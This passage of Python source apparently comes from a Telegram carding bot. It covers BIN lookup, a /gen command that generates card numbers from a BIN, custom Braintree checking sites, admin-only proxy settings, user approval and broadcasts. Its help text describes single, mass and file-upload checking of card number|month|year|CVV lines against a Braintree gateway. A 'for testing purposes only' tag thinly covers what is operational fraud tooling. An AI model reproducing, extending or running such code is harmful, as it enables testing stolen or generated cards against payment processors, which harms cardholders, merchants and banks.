    bin_response += f"🔢 BIN: {bin_number}\n"
    bin_response += "━━━━━━━━━━━━━━━━━━━━━━━━\n"
    bin_response += f"💳 Brand: {card_info.get('brand', 'Unknown')}\n"
    bin_response += f"📊 Type: {card_info.get('type', 'Unknown')}\n"
    bin_response += f"⭐ Level: {card_info.get('level', 'Unknown')}\n"
    bin_response += f"🏦 Bank: {card_info.get('bank', 'Unknown')}\n"
    bin_response += f"{card_info.get('flag', '🌍')} Country: {card_info.get('country', 'Unknown')}\n"
    bin_response += "━━━━━━━━━━━━━━━━━━━━━━━━\n"
    bin_response += f"👤 By: @{message.from_user.username or 'User'}"
    
    bot.edit_message_text(bin_response, message.chat.id, status_msg.message_id)

@bot.message_handler(commands=['gen'])
@require_approval
def generate_cards_command(message):
    command_parts = message.text.split()
    if len(command_parts) < 2:
        text = "╔════════════════════╗\n"
        text += "║  ❌ INVALID FORMAT  ║\n"
        text += "╚════════════════════╝\n\n"
        text += "Usage:\n"
        text += "/gen 453212 10 - Random date\n"
        text += "/gen 453212|06|30 10 - Specific date\n\n"
        text += "Max: 20 cards per request"
        bot.send_message(message.chat.id, text)
        return
    
    bin_input = command_parts[1].strip()
    exp_month = None
    exp_year = None
    
    if '|' in bin_input:
        parts = bin_input.split('|')
        bin_input = parts[0]
        if len(parts) >= 3:
            try:
                exp_month = parts[1].strip()
                exp_year = parts[2].strip()
            except:
                pass
    
    bin_input = bin_input.replace('x', '').replace('X', '')
    bin_number = ''.join(c for c in bin_input if c.isdigit())
    
    quantity = 10
    if len(command_parts) > 2:
        try:
            quantity = int(command_parts[2])
        except:
            quantity = 10
    
    if not bin_number or len(bin_number) < 6:
        text = "╔════════════════════╗\n"
        text += "║   ❌ INVALID BIN   ║\n"
        text += "╚════════════════════╝\n\n"
        text += "BIN must be at least 6 digits"
        bot.send_message(message.chat.id, text)
        return
    
    bin_number = bin_number[:8] if len(bin_number) > 8 else bin_number
    
    status_msg = bot.send_message(message.chat.id, f"🎲 Generating {quantity} cards...")
    
    cards, error = generate_cards(bin_number, quantity, exp_month, exp_year)
    if error:
        bot.edit_message_text(f"❌ Error: {error}", message.chat.id, status_msg.message_id)
        return
    
    user_sessions[message.chat.id] = {'generated_cards': cards}
    
    card_info = get_card_info(bin_number.ljust(16, '0'))
    date_info = "Random dates" if not exp_month else f"{exp_month}/{exp_year}"
    
    gen_response = "╔════════════════════════╗\n"
    gen_response += "║  🎲 GENERATED CARDS  ║\n"
    gen_response += "╚════════════════════════╝\n\n"
    gen_response += f"🔢 BIN: {bin_number}\n"
    gen_response += f"💳 Brand: {card_info.get('brand', 'Unknown')}\n"
    gen_response += f"{card_info.get('flag', '🌍')} Country: {card_info.get('country', 'Unknown')}\n"
    gen_response += f"🏦 Bank: {card_info.get('bank', 'Unknown')}\n"
    gen_response += f"📅 Expiry: {date_info}\n"
    gen_response += "━━━━━━━━━━━━━━━━━━━━━━━━\n"
    gen_response += f"✨ Generated {len(cards)} Cards\n"
    gen_response += "━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
    
    for card in cards:
        gen_response += f"💳 {card}\n"
    
    gen_response += "\n⚠️ For testing purposes only\n"
    gen_response += "💡 Tip: Use /bchk or /bmass to check!"
    
    bot.edit_message_text(gen_response, message.chat.id, status_msg.message_id)

@bot.message_handler(commands=['custom_site'])
@require_approval
def custom_site_command(message):
    command_parts = message.text.split(maxsplit=1)
    if len(command_parts) < 2:
        text = "╔════════════════════╗\n"
        text += "║  🌍 CUSTOM SITE  ║\n"
        text += "╚════════════════════╝\n\n"
        text += "Usage:\n"
        text += "/custom_site https://yoursite.com\n\n"
        text += "💡 Set your own site for checking"
        bot.send_message(message.chat.id, text)
        return
    
    site_url = command_parts[1].strip()
    
    if not site_url.startswith('http://') and not site_url.startswith('https://'):
        bot.send_message(message.chat.id, "❌ URL must start with http:// or https://")
        return
    
    user_custom_sites[message.chat.id] = site_url
    
    text = "╔════════════════════╗\n"
    text += "║  ✅ SITE SET  ║\n"
    text += "╚════════════════════╝\n\n"
    text += f"🌍 Your custom site:\n{site_url}\n\n"
    text += "✅ All your checks will use this site"
    bot.send_message(message.chat.id, text)

@bot.message_handler(commands=['remove_site'])
@require_approval
def remove_site_command(message):
    if message.chat.id in user_custom_sites:
        del user_custom_sites[message.chat.id]
        text = "╔════════════════════╗\n"
        text += "║  🗑️ SITE REMOVED  ║\n"
        text += "╚════════════════════╝\n\n"
        text += "✅ Custom site removed\n"
        text += "🔄 Using default site now"
    else:
        text = "╔════════════════════╗\n"
        text += "║  ℹ️ NO CUSTOM SITE  ║\n"
        text += "╚════════════════════╝\n\n"
        text += "You're using the default site"
    bot.send_message(message.chat.id, text)

@bot.message_handler(commands=['site'])
@require_approval
def check_current_site(message):
    current_site = get_braintree_site(message.chat.id)
    is_custom = message.chat.id in user_custom_sites
    
    text = "╔════════════════════════╗\n"
    text += "║  🌍 CURRENT SITE  ║\n"
    text += "╚════════════════════════╝\n\n"
    text += f"{'🔧 Custom' if is_custom else '📌 Default'} Site:\n{current_site}"
    bot.send_message(message.chat.id, text)

@bot.message_handler(commands=['proxy'])
def set_proxy_command(message):
    if message.from_user.id != ADMIN_ID:
        bot.send_message(message.chat.id, "🚫 Admin only command")
        return
    
    command_parts = message.text.split(maxsplit=1)
    if len(command_parts) < 2:
        text = "╔════════════════════╗\n"
        text += "║   🌐 SET PROXY   ║\n"
        text += "╚════════════════════╝\n\n"
        text += "Usage:\n/proxy http://user:pass@host:port"
        bot.send_message(message.chat.id, text)
        return
    
    proxy_url = command_parts[1].strip()
    status_msg = bot.send_message(message.chat.id, "⏳ Testing proxy...")
    success, msg = set_proxy(proxy_url)
    bot.edit_message_text(msg, message.chat.id, status_msg.message_id)

@bot.message_handler(commands=['removeproxy'])
def remove_proxy_command(message):
    if message.from_user.id != ADMIN_ID:
        bot.send_message(message.chat.id, "🚫 Admin only command")
        return
    bot.send_message(message.chat.id, remove_proxy())

@bot.message_handler(commands=['proxystatus'])
def proxy_status_command(message):
    if message.from_user.id != ADMIN_ID:
        bot.send_message(message.chat.id, "🚫 Admin only command")
        return
    
    with PROXY_LOCK:
        if ACTIVE_PROXY:
            text = f"╔════════════════════╗\n║  📊 PROXY STATUS  ║\n╚════════════════════╝\n\n🟢 Active\n🌐 {ACTIVE_PROXY}"
        else:
            text = "╔════════════════════╗\n║  📊 PROXY STATUS  ║\n╚════════════════════╝\n\n🔴 Not set"
        bot.send_message(message.chat.id, text)

@bot.message_handler(commands=['users'])
def list_users_command(message):
    if message.from_user.id != ADMIN_ID:
        bot.send_message(message.chat.id, "🚫 Admin only command")
        return
    if not approved_users:
        bot.send_message(message.chat.id, "📭 No approved users yet")
        return
    text = "╔════════════════════╗\n║  👥 APPROVED USERS  ║\n╚════════════════════╝\n\n"
    for idx, uid in enumerate(approved_users, 1):
        text += f"{idx}. 🆔 {uid}\n"
    bot.send_message(message.chat.id, text)

@bot.message_handler(commands=['pending'])
def list_pending_command(message):
    if message.from_user.id != ADMIN_ID:
        bot.send_message(message.chat.id, "🚫 Admin only command")
        return
    if not pending_requests:
        bot.send_message(message.chat.id, "📭 No pending requests")
        return
    text = "╔══════════════════════╗\n║  ⏳ PENDING REQUESTS  ║\n╚══════════════════════╝\n\n"
    for user_id, info in pending_requests.items():
        text += f"👤 {info['name']}\n🔗 @{info['username']}\n🆔 {user_id}\n━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
    bot.send_message(message.chat.id, text)

@bot.message_handler(commands=['broadcast'])
def broadcast_command(message):
    if message.from_user.id != ADMIN_ID:
        bot.send_message(message.chat.id, "🚫 Admin only command")
        return
    
    command_parts = message.text.split(maxsplit=1)
    if len(command_parts) < 2:
        text = "╔════════════════════╗\n║  📢 BROADCAST  ║\n╚════════════════════╝\n\nUsage:\n/broadcast Your message"
        bot.send_message(message.chat.id, text)
        return
    
    broadcast_text = command_parts[1].strip()
    
    if not approved_users:
        bot.send_message(message.chat.id, "❌ No approved users to broadcast to")
        return
    
    status_msg = bot.send_message(message.chat.id, "📤 Starting broadcast...")
    success_count = 0
    failed_count = 0
    
    for user_id in approved_users:
        try:
            bot.send_message(user_id, f"╔════════════════════════╗\n║  📢 ADMIN BROADCAST  ║\n╚════════════════════════╝\n\n{broadcast_text}")
            success_count += 1
        except:
            failed_count += 1
        time.sleep(0.5)
    
    bot.edit_message_text(f"✅ Broadcast complete!\n\n✅ Sent: {success_count}\n❌ Failed: {failed_count}", message.chat.id, status_msg.message_id)

@bot.message_handler(commands=['help'])
@require_approval
def send_help(message):
    help_text = "╔════════════════════╗\n"
    help_text += "║   📚 HOW TO USE   ║\n"
    help_text += "╚════════════════════╝\n\n"
    help_text += "💳 SINGLE CHECK\n/bchk 4532123456789012|12|25|123\n\n"
    help_text += "🔍 BIN LOOKUP\n/bin 453212\n\n"
    help_text += "🎲 GENERATE CARDS\n/gen 453212 5\n/gen 453212|06|30 5\n\n"
    help_text += "📦 MASS CHECK\n/bmass card1|mm|yy|cvv\ncard2|mm|yy|cvv\n\n"
    help_text += "📁 FILE UPLOAD\n1. Use /bfile\n2. Upload .txt file\n\n"
    help_text += "✨ Braintree Gateway! ✨"
    bot.send_message(message.chat.id, help_text)

if __name__ == '__main__':
    print("🚀 Braintree Bot started with Jossalicious API!")
    print("✅ All commands working properly")
    print("🔥 API: jossalicious.org")
    bot.infinity_polling()